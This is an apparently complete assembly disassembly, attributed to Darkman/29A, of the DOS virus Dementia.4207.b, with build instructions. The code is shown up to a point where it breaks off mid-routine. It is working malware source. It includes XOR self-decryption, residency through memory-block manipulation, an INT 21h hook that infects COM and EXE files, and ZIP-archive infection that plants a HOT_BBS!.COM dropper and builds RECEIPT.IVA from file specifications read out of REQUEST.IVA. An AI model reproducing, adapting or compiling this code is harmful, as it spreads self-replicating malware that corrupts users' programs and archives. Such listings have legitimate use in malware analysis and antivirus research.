   ; comment *
   ;               Dementia.4207.b
   ;                Disassembly by
   ;                 Darkman/29A

   ;  Dementia.4207.b is a 4207 bytes parasitic resident COM/EXE/ZIP virus.
   ;  Infects files at close file, open file and load and/or execute program by
   ;  appending the virus to the infected COM/EXE file and storing in the infected
   ;  ZIP file. Dementia.4207.b has an error handler, 16-bit exclusive OR (XOR)
   ;  encryption in file and is using archive infection technique.

   ;  To compile Dementia.4207.b with Turbo Assembler v 4.0 type:
   ;    TASM /M DEMENT_B.ASM
   ;    TLINK /x DEMENT_B.OBJ
   ;    EXE2BIN DEMENT_B.EXE DEMENT_B.COM
   ; *

   .model tiny
   .code

   code_begin:
   call_imm16   equ     word ptr $+01h  ; Offset of CALL imm16
            call    prepare_demt
   delta_offset:
            pop     si          ; Load SI from stack
            add     si,(crypt_begin-delta_offset-02h)
            mov     di,si       ; DI = offset of code_end - 02h

            mov     cx,(crypt_begin-crypt_end-02h)/02h
            std             ; Set direction flag
   decrypt_key  equ     word ptr $+01h  ; Decryption key
            mov     dx,00h      ; DX = decryption key

            push    cs cs       ; Save segments at stack
            pop     ds es       ; Load segments from stack (CS)
   decrypt_loop:
            lodsw           ; AX = word of encrypted code
            xor     ax,dx       ; Decrypt two bytes
            stosw           ; Store two plain bytes

            jmp     crypt_end
   crypt_end:
            loop    decrypt_loop

            cld             ; Clear direction flag
            push    cs          ; Save CS at stack
            sub     si,(crypt_end-code_begin)
            nop
            mov     cl,04h      ; Divide by paragraphs
            shr     si,cl       ; SI = offset of crypt_end in para...
            mov     ax,cs       ; AX = code segment
            add     ax,si       ; Add code segment to delta offset...
            push    ax          ; Save AX at stack

            lea     ax,virus_begin  ; AX = offset of virus_begin
            push    ax          ; Save AX at stack

            retf            ; Return far!
   virus_begin:
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            pop     ax          ; Load AX from stack (CS)
            mov     [code_seg_],ax  ; Store code segment

            mov     bx,1492h        ; Dementia.4207.b function
            call    close_file
            cmp     bx,1776h        ; Already resident?
            je      virus_exit      ; Equal? Jump to virus_exit

            call    install
   virus_exit:
            mov     ah,[com_or_exe]     ; AH = COM or EXE executable?
            cmp     ah,00h      ; COM executable?
            nop
            je      vir_com_exit    ; Equal? Jump to vir_com_exit

            mov     ax,[code_seg_]  ; AX = code segment
            mov     bx,[initial_cs]     ; AX = initial CS relative to star...
            sub     ax,bx       ; Subtract initial CS relative to ...
            mov     dx,ax       ; DX = segment of PSP for current ...

            mov     bx,[code_seg]   ; BX = original code segment
            add     ax,bx       ; Add original code segment to seg...
            mov     [code_seg],ax   ; Store original code segment

            xchg    ax,dx       ; AX = segment of current PSP proc...

            cli             ; Clear interrupt-enable flag
            mov     bx,[stack_seg]  ; BX = original stack segment
            add     ax,bx       ; Add original stack segment to se...
            mov     ss,ax       ; SS = original stack segment

            mov     ax,[stack_ptr]  ; AX = original stack pointer
            mov     sp,ax       ; SP =    "       "      "
            sti             ; Set interrupt-enable flag

            mov     ah,62h      ; Get current PSP address
            int     21h
            mov     ds,bx       ; DS = segment of PSP for current ...
            mov     es,bx       ; ES = segment of PSP for current ...

            xor     ax,ax       ; Zero AX
            xor     bx,bx       ; Zero BX
            xor     cx,cx       ; Zero CX
            xor     dx,dx       ; Zero DX
            xor     si,si       ; Zero SI
            xor     di,di       ; Zero DI

            jmp     dword ptr cs:[instruct_ptr]
   vir_com_exit:
            mov     di,100h         ; DI = offset of beginning of code
            lea     si,origin_code  ; SI = offset of origin_code
            nop
            movsw           ; Move the original code to beginning
            movsb           ;  "    "     "      "   "      "

            push    es          ; Save ES at stack

            mov     ax,100h         ; AX = offset of beginning of code
            push    ax          ; Save AX at stack

            xor     ax,ax       ; Zero AX
            xor     bx,bx       ; Zero BX
            xor     cx,cx       ; Zero CX
            xor     dx,dx       ; Zero DX
            xor     si,si       ; Zero SI
            xor     di,di       ; Zero DI

            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            retf            ; Return far!

   upcase_char  proc    near        ; Upcase character
            cmp     al,'a'              ; Lowcase character?
            jl      dont_upcase     ; Less? Jump to dont_upcase
            cmp     al,'z'              ; Lowcase character?
            jg      dont_upcase     ; Greater? Jump to dont_upcase

            sub     al,20h      ; Upcase character
   dont_upcase:
            ret             ; Return!
            endp

   int21_virus  proc    near        ; Interrupt 21h of Dementia.4207.b
            pushf           ; Save flags at stack
            cld             ; Clear direction flag

            cmp     ah,3eh      ; Close file?
            jne     tst_open_fil    ; Not equal? Jump to tst_open_fil

            cmp     bx,1492h        ; Dementia.4207.b function?
            jne     tst_open_fil    ; Not equal? Jump to tst_open_fil

            mov     bx,1776h        ; Already resident

            popf            ; Load flags from stack

            iret            ; Interrupt return!
   tst_open_fil:
            cmp     ah,3dh      ; Open file
            jne     tst_load_and    ; Not equal? Jump to tst_load_and

            cmp     al,0ffh         ; Dementia.4207.b function
            je      dementia_fun    ; Equal? Jump to dementia_fun

            push    ax si       ; Save registers at stack
            mov     si,dx       ; SI = offset of filename
   find_dot:
            lodsb           ; AL = byte of filename
            cmp     al,00h      ; End of filename?
            je      open_fi_exit    ; Equal? Jump to open_fi_exit

            cmp     al,'.'              ; Found the dot in the filename
            jne     find_dot        ; Not equal? Jump to find_dot

            lodsb           ; AL = byte of extension
            call    upcase_char
            cmp     al,'C'              ; COM executable?
            jne     tst_exe_exec    ; Not equal? Jump to tst_exe_exec

            lodsb           ; AL = byte of extension
            call    upcase_char
            cmp     al,'O'              ; COM executable?
            jne     open_fi_exit    ; Not equal? Jump to open_fi_exit

            lodsb           ; AL = byte of extension
            call    upcase_char
            cmp     al,'M'              ; COM executable?
            jne     open_fi_exit    ; Not equal? Jump to open_fi_exit

            call    inf_com_exe

            jmp     open_fi_exit
   tst_exe_exec:
            cmp     al,'E'              ; EXE executable?
            jne     tst_zip_arch    ; Not equal? Jump to tst_zip_arch

            lodsb           ; AL = byte of extension
            call    upcase_char
            cmp     al,'X'              ; EXE executable?
            jne     open_fi_exit    ; Not equal? Jump to open_fi_exit

            lodsb           ; AL = byte of extension
            call    upcase_char
            cmp     al,'E'              ; EXE executable?
            jne     open_fi_exit    ; Not equal? Jump to open_fi_exit

            call    inf_com_exe

            jmp     open_fi_exit
   tst_zip_arch:
            cmp     al,'Z'              ; ZIP archive?
            jne     open_fi_exit    ; Not equal? Jump to open_fi_exit

            lodsb           ; AL = byte of extension
            call    upcase_char
            cmp     al,'I'              ; ZIP archive?
            jne     open_fi_exit    ; Not equal? Jump to open_fi_exit

            lodsb           ; AL = byte of extension
            call    upcase_char
            cmp     al,'P'              ; ZIP archive?
            jne     open_fi_exit    ; Not equal? Jump to open_fi_exit

            call    infect_zip

            jmp     open_fi_exit
   open_fi_exit:
            pop     si ax       ; Load registers from stack

            jmp     tst_load_and
   dementia_fun:
            mov     al,02h      ; Dementia.4207.b function
   tst_load_and:
            cmp     ah,4bh      ; Load and/or execute program?
            jne     int21_exit      ; Not equal? Jump to int21_exit

            call    inf_com_exe
   int21_exit:
            popf            ; Load flags from stack

            jmp     cs:[int21_addr]
            endp

   install      proc    near        ; Allocate memory, move virus to t...
            push    es          ; Save ES at stack

            mov     ah,52h      ; Get list of lists
            int     21h

            mov     ax,es:[bx-02h]  ; AX = segment of first memory con...
   next_mcb:
            mov     ds,ax       ; DS = segment of current memory c...

            mov     al,ds:[00h]     ; AL = block type
            cmp     al,'Z'              ; Last block in chain?
            je      allocate_mem    ; Equal? Jump to allocate_mem

            mov     ax,ds       ; AX = segment of current memory c...
            mov     bx,ds:[03h]     ; BX = size of memory block in par...
            add     ax,bx       ; Add size of memory block in para...
            inc     ax          ; AX = segment of next memory cont...

            jmp     next_mcb
   allocate_mem:
            mov     bx,ds:[03h]     ; BX = size of memory block in par...
            sub     bx,(code_end-code_begin+0fh)/10h*02h
            mov     ds:[03h],bx     ; Store new size of memory control...

            mov     ax,ds       ; AX = segment of last memory cont...
            add     ax,bx       ; Add new size of memory block in ...
            inc     ax          ; AX = segment of virus
            mov     es,ax       ; ES =    "    "    "

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            xor     si,si       ; Zero SI
            xor     di,di       ; Zero DI
            mov     cx,(code_end-code_begin)
            rep     movsb       ; Move virus to top of memory

            push    es          ; Save ES at stack

            lea     ax,install_     ; AX = offset of install_
            push    ax          ; Save AX at stack

            retf            ; Return far!
   install_:
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     ax,3521h        ; Get interrupt vector 21h
            int     21h
            mov     word ptr [int21_addr+02h],es
            mov     word ptr [int21_addr],bx

            lea     dx,int21_virus  ; DX = offset of int21_virus
            mov     ax,2521h        ; Set interrupt vector 21h
            int     21h

            pop     es          ; Load ES from stack

            ret             ; Return!
            endp

   inf_com_exe  proc    near        ; Infect COM/EXE file
            push    bp          ; Save BP at stack
            mov     bp,sp       ; BP = stack pointer
            sub     sp,06h      ; Correct stack pointer

            push    ax bx cx dx si di ds es

            call    int24_store

            call    open_file
            jc      com_exe_exit    ; Error? Jump to com_exe_exit

            call    load_info
            and     cx,0000000000011111b
            cmp     cx,0000000000000001b
            je      call_close      ; Already infected? Jump to call_c...

            mov     ax,cs       ; AX = code segment
            add     ax,(code_end-code_begin+0fh)/10h
            mov     ds,ax       ; DS = segment of data buffer

            mov     cx,20h      ; Read thirty-two bytes
            call    read_file

            mov     ax,ds:[00h]     ; AX = EXE signature
            cmp     ax,'MZ'             ; Found EXE signature?
            je      call_infect     ; Equal? Jump to call_infect
            cmp     ax,'ZM'             ; Found EXE signature?
            je      call_infect     ; Equal? Jump to call_infect

            call    infect_com

            jmp     call_mark
   call_infect:
            call    infect_exe
   call_mark:
            call    infect_mark
   call_close:
            call    close_file
   com_exe_exit:
            call    int24_load

            pop     es ds di si dx cx bx ax

            mov     sp,bp       ; SP = stack pointer

            pop     bp          ; Load BP from stack

            ret             ; Return!
            endp

   infect_zip   proc    near        ; Infect ZIP archive
            push    bp          ; Save BP at stack
            mov     bp,sp       ; BP = stack pointer
            sub     sp,28h      ; Correct stack pointer

            push    ax bx cx dx si di ds es

            xor     ax,ax       ; Didn't found file
            mov     [bp-0eh],ax     ; Store didn't found HOT_BBS!.COM
            mov     [bp-10h],ax     ;   "     "      "   REQUEST.IVA
            mov     [bp-12h],ax     ;   "     "      "   RECEIPT.IVA

            call    int24_store

            push    dx ds       ; Save registers at stack
            lea     dx,temp_file    ; DX = offset of temp_file
            nop
            call    create_file
            mov     [bp-0ah],ax     ; Store file handle of !#TEMP#!
            pop     ds dx       ; Load registers from stack

            call    open_file
            jnc     load_info_      ; No error? Jump to load_info_

            jmp     inf_zip_exit
   load_info_:
            mov     [bp-08h],ax     ; Store file handle of ZIP file

            call    load_info

            mov     ax,cs       ; AX = code segment
            add     ax,(code_end-code_begin+0fh)/10h
            mov     ds,ax       ; DS = segment of data buffer
   next_lfh_sig:
            mov     cx,04h      ; Read four bytes
            call    read_file

            mov     ax,ds:[00h]     ; AX = low-order word of file head...
            cmp     ax,'KP'             ; Found low-order word of file ha...?
            je      test_dir_sig    ; Equal? Jump to test_dir_sig

            jmp     call_mark_
   test_dir_sig:
            mov     ax,ds:[02h]     ; AX = high-order word of file hea...
            cmp     ax,201h         ; Found high-order word of central...
            jne     read_lfh        ; Not equal? Jump to read_lfh

            jmp     zero_cdh_num
   read_lfh:
            mov     cx,1ah      ; Read twenty-six bytes
            call    read_file

            mov     cx,ds:[16h]     ; CX = filename length
            mov     dx,20h      ; DI = offset of filename
            call    read_file_

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            lea     di,request_iva  ; DI = offset of request_iva
            nop
            mov     si,20h      ; SI = offset of filename
   request_loop:
            lodsb           ; AL = byte of filename
            mov     ah,es:[di]      ; AH = byte of request_iva

            inc     di          ; Increase index register

            cmp     ah,00h      ; End of filename?
            je      found_reques    ; Equal? Jump to found_reques

            cmp     ah,al       ; Byte of filename equal to byte o...
            jne     find_callfas    ; Not equal? Jump to find_callfas

            jmp     request_loop
   found_reques:
            mov     ax,01h      ; Found REQUEST.IVA
            mov     [bp-10h],ax     ; Store found REQUEST.IVA

            xor     cx,cx       ; Zero CX
            xor     dx,dx       ; Zero DX
            call    set_pos_cfp
            mov     [bp-24h],ax     ; AX = low-order word of extra field
            mov     [bp-22h],dx     ; DX = high-order word of extra field
   find_callfas:
            lea     di,hot_bbs__com     ; DI = offset of hot_bbs__com
            nop
            mov     si,20h      ; SI = offset of filename
   callfas_loop:
            lodsb           ; AL = byte of filename
            mov     ah,es:[di]      ; AH = byte of hot_bbs__com

            inc     di          ; Increase index register

            cmp     ah,00h      ; End of filename?
            je      found_callfa    ; Equal? Jump to found_callfa

            cmp     ah,al       ; Byte of filename equal to byte o...
            jne     find_receipt    ; Not equal? Jump to find_receipt

            jmp     callfas_loop
   found_callfa:
            mov     ax,01h      ; Found HOT_BBS!.COM
            mov     [bp-0eh],ax     ; Store found HOT_BBS!.COM
   find_receipt:
            lea     di,receipt_iva  ; DI = offset of receipt_iva
            nop
            mov     si,20h      ; SI = offset of filename
   receipt_loop:
            lodsb           ; AL = byte of filename
            mov     ah,es:[di]      ; AH = byte of receipt_iva

            inc     di          ; Increase index register

            cmp     ah,00h      ; End of filename?
            je      found_receip    ; Equal? Jump to found_receip

            cmp     ah,al       ; Byte of filename equal to byte o...
            jne     calc_lfh_ptr    ; Not equal? Jump to calc_lfh_ptr

            jmp     receipt_loop
   found_receip:
            mov     ax,01h      ; Found RECEIPT.IVA
            mov     [bp-12h],ax     ; Store found RECEIPT.IVA
   calc_lfh_ptr:
            mov     dx,ds:[0eh]     ; DX = low-order word of compresse...
            mov     cx,ds:[10h]     ; CX = high-order word of compress...
            mov     ax,ds:[18h]     ; AX = extra field length
            add     dx,ax       ; Add extra field length to compre...
            adc     cx,00h      ; Convert to 32-bit

            call    set_pos_cfp

            jmp     next_lfh_sig
   zero_cdh_num:
            xor     ax,ax       ; No central directory file header...
            mov     [bp-0ch],ax     ; Store no central directory file ...
   copy_cds:
            mov     ax,[bp-0ch]     ; AX = number of central directory...
            inc     ax          ; Increase number of central direc...
            mov     [bp-0ch],ax     ; Store number of central director...

            mov     bx,[bp-08h]     ; BX = file handle of ZIP file
            mov     cx,2ah      ; Read forty-two bytes
            call    read_file

            mov     bx,[bp-0ah]     ; BX = file handle of !#TEMP#!
            call    write_file_

            mov     cx,ds:[18h]     ; CX = filename length
            mov     bx,ds:[1ah]     ; BX = extra field length
            add     cx,bx       ; Add extra field length to filena...
            mov     bx,ds:[1ch]     ; BX = file comment length
            add     cx,bx       ; CX = number of bytes to read

            mov     bx,[bp-08h]     ; BX = file handle of ZIP file
            call    read_file_

            mov     bx,[bp-0ah]     ; BX = file handle of !#TEMP#!
            call    write_file_

            mov     cx,04h      ; Read four bytes
            mov     bx,[bp-08h]     ; BX = file handle of ZIP file
            call    read_file_

            mov     ax,ds:[00h]     ; AX = low-order word of end of ce...
            cmp     ax,'KP'             ; Found low-order word of end of ...?
            je      test_eoc_sig    ; Equal? Jump to test_eoc_sig

            jmp     call_mark_
   test_eoc_sig:
            mov     ax,ds:[02h]     ; AX = high-order word of end of c...
            cmp     ax,605h         ; Found high-order word of end of ...
            je      copy_eocds      ; Equal? Jump to read_oecds

            jmp     copy_cds
   copy_eocds:
            mov     bx,[bp-08h]     ; BX = file handle of ZIP file
            mov     cx,12h      ; Read eightteen bytes
            call    read_file

            mov     ax,ds:[0ch]     ; AX = low-order word of offset of...
            mov     [bp-18h],ax     ; Store low-order word of offset o...
            mov     ax,ds:[0eh]     ; AX = high-order word of offset o...
            mov     [bp-16h],ax     ; Store high-order word of offset ...

            mov     bx,[bp-0ah]     ; BX = file handle of !#TEMP#!
            call    write_file_

            mov     cx,ds:[10h]     ; CX = zipfile comment length
            mov     bx,[bp-08h]     ; BX = file handle of ZIP file
            call    read_file_

            mov     bx,[bp-0ah]     ; BX = file handle of !#TEMP#!
            call    write_file_

            mov     ax,[bp-10h]     ; AX = found REQUEST.IVA
            or      ax,ax       ; Didn't found REQUEST.IVA
            jz      test_callfas    ; Zero? Jump to test_callfas

            jmp     test_receipt
   test_callfas:
            mov     ax,[bp-0eh]     ; AX = found HOT_BBS!.COM
            or      ax,ax       ; Didn't found HOT_BBS!.COM
            jz      create_file_    ; Zero? Jump to create_file_

            jmp     call_mark_
   create_file_:
            lea     dx,hot_bbs__com     ; DX = offset of hot_bbs__com
            nop
            call    create_file
            mov     [bp-14h],ax     ; Store file handle of HOT_BBS!.COM
            mov     bx,[bp-14h]     ; BX = file handle of HOT_BBS!.COM

            mov     cx,(file_end-file_begin)
            nop
            lea     dx,file_begin   ; DX = offset of file_begin
            nop
            call    write_file_

            call    close_file

            mov     ax,01h      ; Don't test filesize
            mov     [tst_filesize],ax   ; Store don't test filesize

            lea     dx,hot_bbs__com     ; DX = offset of hot_bbs__com
            nop
            call    inf_com_exe

            xor     ax,ax       ; Test filesize
            mov     [tst_filesize],ax   ; Store test filesize

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            lea     si,hot_bbs__com     ; SI = offset of hot_bbs__com
            nop
            lea     di,filename     ; DI = offset of filename
            nop
            mov     cx,0dh      ; Move thirteen bytes
            rep     movsb       ; Move HOT_BBS!.COM to filename
   open_filenam:
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            lea     dx,filename     ; DX = offset of filename
            nop
            call    open_file

            call    set_pos_eof
            mov     [bp-1ch],ax     ; Store low-order word of filesize
            mov     [bp-1ah],dx     ; Store high-order word of filesize

            call    calc_crc32
            mov     [bp-20h],ax     ; Store low-order word of CRC-32 c...
            mov     [bp-1eh],dx     ; Store high-order word of CRC-32 ...

            mov     bx,[bp-08h]     ; BX = file handle of ZIP file
            mov     cx,[bp-16h]     ; CX = high-order word of offset o...
            mov     dx,[bp-18h]     ; DX = low-order word of offset of...
            call    set_pos_sof_

            mov     ax,cs       ; AX = code segment
            add     ax,(code_end-code_begin+0fh)/10h
            mov     ds,ax       ; DS = segment of data buffer

            mov     ax,'KP'             ; AX = low-order word of local hea...
            mov     ds:[00h],ax     ; Store low-order word of local he...
            mov     ax,403h         ; AX = high-order word of local hea...
            mov     ds:[02h],ax     ; Store high-order word of local he...
            mov     ax,0ah      ; AX = version needed to extract (v...
            mov     ds:[04h],ax     ; Store version needed to extract (...
            xor     ax,ax       ; AX = general purpose bit flag and...
            mov     ds:[06h],ax     ; Store general purpose bit flag
            mov     ds:[08h],ax     ; Store compression method (the fil...
            mov     ax,1801h        ; AX = last modified file time
            mov     ds:[0ah],ax     ; Store last modified file time
            mov     ax,1d01h        ; AX = last modified file date
            mov     ds:[0ch],ax     ; Store last modified file date
            mov     ax,[bp-20h]     ; AX = low-order word of CRC-32 ch...
            mov     ds:[0eh],ax     ; Store low-order word of CRC-32 c...
            mov     ax,[bp-1eh]     ; AX = high-order word of CRC-32 c...
            mov     ds:[10h],ax     ; Store high-order word of CRC-32 ...
            mov     ax,[bp-1ch]     ; AX = low-order word of filesize
            mov     ds:[12h],ax     ; Store low-order word of compress...
            mov     ds:[16h],ax     ; Store low-order word of uncompre...
            mov     ax,[bp-1ah]     ; AX = high-order word of filesize
            mov     ds:[14h],ax     ; Store high-order word of compres...
            mov     ds:[18h],ax     ; Store high-order word of uncompr...
            mov     ax,0ch      ; AX = filename length (12 bytes)
            mov     ds:[1ah],ax     ; Store filename length (12 bytes)
            xor     ax,ax       ; AX = extra field length (0 bytes)
            mov     ds:[1ch],ax     ; Store extra field length (0 bytes)

            mov     cx,1eh      ; Write thirty bytes
            call    write_file

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            lea     dx,filename     ; DX = offset of filename
            nop
            mov     cx,0ch      ; Write twelve bytes
            nop
            call    write_file_

            mov     ax,cs       ; AX = code segment
            add     ax,(code_end-code_begin+0fh)/10h
            mov     ds,ax       ; DS = segment of data buffer

            mov     bx,[bp-14h]     ; BX = file handle of HOT_BBS!.COM
            call    set_pos_sof
   copy_callfas:
            mov     bx,[bp-14h]     ; BX = file handle of HOT_BBS!.COM
            mov     cx,400h         ; Read one thousand and twenty-fou...
            call    read_file
            cmp     ax,00h      ; Read all of the file?
            je      copy_cds_       ; Equal? Jump to copy_cds_

            mov     cx,ax       ; CX = number of bytes actually read
            mov     bx,[bp-08h]     ; BX = file handle of ZIP file
            call    write_file

            jmp     copy_callfas
   copy_cds_:
            mov     bx,[bp-0ah]     ; BX = file handle of !#TEMP#!
            call    set_pos_sof
   cpy_cds_loop:
            mov     ax,[bp-0ch]     ; AX = number of central directory...
            cmp     ax,00h      ; No central directory file header?
            je      wrt_last_cds    ; Equal? Jump to write_last_cds

            dec     ax          ; Decrease number of central direc...
            mov     [bp-0ch],ax     ; Store number of central director...

            mov     ax,'KP'             ; AX = low-order word of central d...
            mov     ds:[00h],ax     ; Store low-order word of central ...
            mov     ax,201h         ; AX = high-order word of central ...
            mov     ds:[02h],ax     ; Store high-order word of central...

            mov     bx,[bp-0ah]     ; BX = file handle of !#TEMP#!
            mov     cx,2ah      ; Read forty-two bytes
            mov     dx,04h      ; DX = offset of central directory...
            call    read_file_

            mov     cx,ds:[1ch]     ; CX = filename length
            mov     dx,ds:[1eh]     ; DX = extra field length
            add     cx,dx       ; Add extra field length to filena...
            mov     dx,ds:[20h]     ; DX = file comment length
            add     cx,dx       ; CX = number of bytes to read

            push    cx          ; Save CX at stack
            mov     dx,2eh      ; DX = offset of central directory...
            call    read_file_

            mov     bx,[bp-08h]     ; BX = file handle of ZIP file
            pop     cx          ; Load CX from stack
            add     cx,2eh      ; Add size of central directory fi...
            call    write_file

            jmp     cpy_cds_loop
   wrt_last_cds:
            mov     ax,0ah      ; AX = version made by (version 1....
            mov     ds:[04h],ax     ; Store version made by (version 1...
            mov     ds:[06h],ax     ; Store version needed to extract (...
            xor     ax,ax       ; AX = general purpose bit flag and...
            mov     ds:[08h],ax     ; Store general purpose bit flag
            mov     ds:[0ah],ax     ; Store compression method (the fil...
            mov     ax,1801h        ; AX = last modified file time
            mov     ds:[0ch],ax     ; Store last modified file time
            mov     ax,1d01h        ; AX = last modified file date
            mov     ds:[0eh],ax     ; Store last modified file date
            mov     ax,[bp-20h]     ; AX = low-order word of CRC-32 ch...
            mov     ds:[10h],ax     ; Store low-order word of CRC-32 c...
            mov     ax,[bp-1eh]     ; AX = high-order word of CRC-32 c...
            mov     ds:[12h],ax     ; Store high-order word of CRC-32 ...
            mov     ax,[bp-1ch]     ; AX = low-order word of filesize
            mov     ds:[14h],ax     ; Store low-order word of compress...
            mov     ds:[18h],ax     ; Store low-order word of uncompre...
            mov     ax,[bp-1ah]     ; AX = high-order word of filesize
            mov     ds:[16h],ax     ; Store high-order word of compres...
            mov     ds:[1ah],ax     ; Store high-order word of compres...
            mov     ax,0ch      ; AX = filename length (12 bytes)
            mov     ds:[1ch],ax     ; Store filename length (12 bytes)
            xor     ax,ax       ; AX = extra field length, file co...
            mov     ds:[1eh],ax     ; Store extra field length (0 bytes)
            mov     ds:[20h],ax     ; Store file comment length (0 bytes)
            mov     ds:[22h],ax     ; Store disk number start (0 bytes)
            mov     ds:[24h],ax     ; Store internal file attributes
            mov     ds:[26h],ax     ; Store low-order word of external...
            mov     ds:[28h],ax     ; Store high-order word of externa...
            mov     ax,[bp-18h]     ; AX = low-order word of offset of...
            mov     ds:[2ah],ax     ; Store low-order word of relative...
            mov     ax,[bp-16h]     ; AX = high-order word of offset o...
            mov     ds:[2ch],ax     ; Store high-order word of relativ...

            mov     bx,[bp-08h]     ; BX = file handle of ZIP file
            mov     cx,2eh      ; Write forty-six bytes
            call    write_file

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            lea     dx,filename     ; DX = offset of filename
            nop
            mov     cx,0ch      ; Write twelve bytes
            nop
            call    write_file_

            mov     ax,cs       ; AX = code segment
            add     ax,(code_end-code_begin+0fh)/10h
            mov     ds,ax       ; DS = segment of data buffer

            mov     ax,'KP'             ; AX = low-order word of end of ce...
            mov     ds:[00h],ax     ; Store low-order word of end of c...
            mov     ax,605h         ; AX = high-order word of end of c...
            mov     ds:[02h],ax     ; Store high-order word of end of ...

            mov     bx,[bp-0ah]     ; BX = file handle of !#TEMP#!
            mov     cx,12h      ; Read eightteen bytes
            mov     dx,04h      ; DX = offset of end of central di...
            call    read_file_

            mov     cx,ds:[14h]     ; CX = zipfile comment length
            push    cx          ; Save CX at stack
            mov     dx,16h      ; DX = offset of zipfile comment
            call    read_file_

            mov     ax,ds:[08h]     ; AX = total number of entries in ...
            inc     ax          ; Increase total number of entries...
            mov     ds:[08h],ax     ; Store total number of entries in...
            mov     ax,ds:[0ah]     ; AX = total number of entries in ...
            inc     ax          ; Increase total number of entries...
            mov     ds:[0ah],ax     ; Store total number of entries in...
            mov     ax,ds:[0ch]     ; AX = low-order word of size of t...
            mov     dx,ds:[0eh]     ; DX = high-order word of size of ...
            add     ax,3ah      ; Add size of central directory fi...
            nop
            adc     dx,00h      ; Convert to 32-bit
            mov     ds:[0ch],ax     ; Store low-order word of size of ...
            mov     ds:[0eh],dx     ; Store high-order word of size of...
            mov     ax,ds:[10h]     ; AX = low-order word of offset of...
            mov     dx,ds:[12h]     ; DX = high-order word of offset o...
            add     ax,2ah      ; Add size of local file header to...
            nop
            adc     dx,00h      ; Convert to 32-bit
            mov     bx,[bp-1ah]     ; BX = high-order word of filesize
            add     dx,bx       ; Add high-order word of filesize ...
            mov     bx,[bp-1ch]     ; BX = low-order word of filesize
            add     ax,bx       ; Add low-order word of filesize t...
            adc     dx,00h      ; Convert to 32-bit
            mov     ds:[10h],ax     ; Store low-order word of offset o...
            mov     ds:[12h],dx     ; Store high-order word of offset ...

            mov     bx,[bp-08h]     ; BX = file handle of ZIP file
            pop     cx          ; Load CX from stack
            add     cx,16h      ; Add size of end of central direc...
            call    write_file

            mov     bx,[bp-14h]     ; BX = file handle of HOT_BBS!.COM
            call    close_file

            lea     dx,filename     ; DX = offset of filename
            nop
            call    delete_file

            jmp     call_mark_
   test_receipt:
            mov     ax,[bp-12h]     ; AX = found RECEIPT.IVA
            or      ax,ax       ; Didn't found RECEIPT.IVA
            jz      exam_extra      ; Zero? Jump to exam_extra

            jmp     call_mark_
   exam_extra:
            mov     bx,[bp-08h]     ; BX = file handle of ZIP file
            mov     cx,[bp-22h]     ; CX = high-order word of extra field
            mov     dx,[bp-24h]     ; DX = low-order word of extra field
            call    set_pos_sof_

            mov     ax,cs       ; AX = code segment
            add     ax,(code_end-code_begin+0fh)/10h
            mov     ds,ax       ; DS = segment of data buffer
            mov     es,ax       ; ES = segment of data buffer

            mov     cx,400h         ; Read one thousand and twenty-fou...
            call    read_file

            cld             ; Clear direction flag
            xor     si,si       ; Zero SI
            xor     di,di       ; Zero DI
            lodsw           ; AX = word of extra field
            cmp     ax,1492h        ; Found infection mark?
            je      comp_extra      ; Equal? Jump to comp_extra

            jmp     call_mark_
   comp_extra:
            lodsw           ; AX = word of extra field
            cmp     ax,1776h        ; Found infection mark?
            je      load_extra      ; Equal? Jump to load_extra

            jmp     call_mark_
   load_extra:
            lodsw           ; AX = 16-bit decryption key
            mov     dx,ax       ; DX =   "        "       "
            lodsb           ; AL = number of file specifications

            xor     cx,cx       ; Zero CX
            mov     cl,al       ; CL = number of filespecification
            push    ax          ; Save AX at stack
   decrypt_next:
            push    cx          ; Save CX at stack
            mov     cx,07h      ; Decryption fourteen bytes
   decrypt_spec:
            lodsw           ; AX = word of encrypted file spec...
            xor     ax,dx       ; Decrypt word of file specification
            stosw           ; Store word of file specification

            loop    decrypt_spec

            pop     cx          ; Load CX from stack

            loop    decrypt_next

            mov     ax,ds       ; AX = segment of data buffer
            add     ax,40h      ; AX = segment of pathname
            mov     es,ax       ; ES =    "    "     "

            push    ds          ; Save DS at stack
            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            mov     ah,47h      ; Get current directory
            xor     dl,dl       ; Default drive
            xor     si,si       ; Zero SI
            int     21h
            pop     ds          ; Load DS from stack

            mov     ax,es       ; AX = segment of pathname
            add     ax,04h      ; AX = segment of end of pathname
            mov     es,ax       ; ES =    "    "   "  "     "

            xor     di,di       ; Zero DI
            mov     al,'\'              ; AL = backslash
            stosb           ; Store backslash
            xor     al,al       ; AL = zero
            stosb           ; Store zero

            push    es          ; Save ES at stack
            mov     ah,2fh      ; Get disk transfer area address
            int     21h
            mov     [bp-26h],es     ; Store segment of disk transfer a...
            mov     [bp-28h],bx     ; Store offset of disk transfer ar...
            pop     es          ; Load ES from stack

            push    ds          ; Save DS at stack
            mov     ax,cs       ; AX = code segment
            add     ax,(code_end-code_begin+0fh)/10h+48h
            mov     ds,ax       ; DS = segment of disk transfer area

            xor     dx,dx       ; Zero DX
            mov     ah,1ah      ; Set disk transfer area address
            int     21h

            lea     dx,receipt_iva  ; DX = offset of receipt_iva
            nop
            call    create_file
            mov     bx,ax       ; BX = file handle of RECEIPT.IVA
            mov     [bp-14h],ax     ; Store file handle of RECEIPT.IVA
            pop     ds          ; Load DS from stack

            pop     ax          ; Load AX from stack
            mov     dx,01h      ; Don't store backslash
            call    create_recei

            mov     bx,[bp-14h]     ; BX = file handle of RECEIPT.IVA
            call    set_pos_sof

            mov     ax,cs       ; AX = code segment
            add     ax,(code_end-code_begin+0fh)/10h+48h
            mov     ds,ax       ; DS = segment of disk transfer area
            mov     es,ax       ; ES =    "    "   "      "      "
   encrypt_rece:
            mov     cx,400h         ; Read one thousand and twenty-fou...
            call    read_file
            cmp     ax,00h      ; Read all of the file?
            je      set_dta_addr    ; Equal? Jump to set_dta_addr

